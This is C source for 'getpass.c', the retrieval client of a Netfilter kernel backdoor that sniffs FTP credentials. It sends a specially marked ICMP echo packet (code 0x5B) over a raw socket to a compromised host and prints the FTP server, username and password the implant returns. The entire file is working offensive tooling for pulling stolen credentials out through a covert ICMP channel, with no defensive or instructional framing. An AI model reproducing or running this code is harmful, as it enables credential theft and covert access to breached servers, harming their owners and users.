/* getpass.c - simple utility to get username/password pair from 
* the Netfilter backdoor FTP sniffer. Very kludgy, but effective. 
* Mostly stripped from my source for InfoPig. 
* 
* Written by bioforge  -  March 2003 */  
  
#include <stdio.h>  
#include <stdlib.h>  
#include<sys/types.h>  
#include<sys/socket.h>  
  
#include <netinet/in.h>    
#include <arpa/inet.h>    
#include <unistd.h>    
#include <string.h>    
#include <netinet/ip.h>           /// struct ip  
#include <netinet/ip_icmp.h>      /// struct icmp  
  
  
  
/* Function prototypes */  
static unsigned short checksum(int numwords, unsigned short *buff);  
  
int main(int argc, char *argv[])  
{  
    unsigned char dgram[256];           /* Plenty for a PING datagram */  
    unsigned char recvbuff[256];  
    struct ip *iphead = (struct ip *)dgram;  
    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));  
    struct sockaddr_in src;  
    struct sockaddr_in addr;  
    struct in_addr my_addr;  
    struct in_addr serv_addr;  
    socklen_t src_addr_size = sizeof(struct sockaddr_in);  
    int icmp_sock = 0;  
    int one = 1;  
    int *ptr_one = &one;  
      
    if (argc < 3) {  
    fprintf(stderr, "Usage:  %s remoteIP myIP\n", argv[0]);  
    exit(1);  
    }  
  
    /* Get a socket */  
    if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {  
    perror("Couldn't open raw socket! ");  
        exit(1);  
    }  
  
    /* set the HDR_INCL option on the socket */  
    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL,  
        ptr_one, sizeof(one)) < 0) {  
        close(icmp_sock);  
    perror("Couldn't set HDRINCL option!");  
        exit(1);  
    }  
      
    addr.sin_family = AF_INET;  
    addr.sin_addr.s_addr = inet_addr(argv[1]);  
      
    my_addr.s_addr = inet_addr(argv[2]);  
      
    memset(dgram, 0x00, 256);  
    memset(recvbuff, 0x00, 256);  
      
    /* Fill in the IP fields first */  
    iphead->ip_hl  = 5;  
    iphead->ip_v   = 4;  
    iphead->ip_tos = 0;  
    iphead->ip_len = 84;  
    iphead->ip_id  = (unsigned short)rand();  
    iphead->ip_off = 0;  
    iphead->ip_ttl = 128;  
    iphead->ip_p   = IPPROTO_ICMP;  
    iphead->ip_sum = 0;  
    iphead->ip_src = my_addr;  
    iphead->ip_dst = addr.sin_addr;  
      
    /* Now fill in the ICMP fields */  
    icmphead->icmp_type = ICMP_ECHO;  
    icmphead->icmp_code = 0x5B;  
    icmphead->icmp_cksum = checksum(42, (unsigned short *)icmphead);  
      
    /* Finally, send the packet */  
    fprintf(stdout, "Sending request...\n");  
    if (sendto(icmp_sock, dgram, 84, 0, (struct sockaddr *)&addr,  
           sizeof(struct sockaddr)) < 0) {  
    perror("Failed sending request!");  
        return 0;  
    }  
  
    fprintf(stdout, "Waiting for reply...\n");  
    if (recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src,  
         &src_addr_size) < 0) {  
         perror("Failed getting reply packet!");  
    close(icmp_sock);  
    exit(1);  
    }  
      
    iphead = (struct ip *)recvbuff;  
    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));  
    memcpy(&serv_addr, ((char *)icmphead + 8),  
           sizeof (struct in_addr));  
      
    fprintf(stdout, "Stolen for ftp server %s:\n", inet_ntoa(serv_addr));  
    fprintf(stdout, "Username:    %s\n",  
         (char *)((char *)icmphead + 12));  
    fprintf(stdout, "Password:    %s\n",  
         (char *)((char *)icmphead + 28));  
      
    close(icmp_sock);  
      
    return 0;  
}  
  
/* Checksum-generation function. It appears that PING'ed machines don't 
* reply to PINGs with invalid (ie. empty) ICMP Checksum fields... 
* Fair enough I guess. */  
static unsigned short checksum(int numwords, unsigned short *buff)  
{  
   unsigned long sum;  
     
   for(sum = 0;numwords > 0;numwords--)  
     sum += *buff++;   /* add next word, then increment pointer */  
     
   sum = (sum >> 16) + (sum & 0xFFFF);  
   sum += (sum >> 16);  
     
   return ~sum;  
}  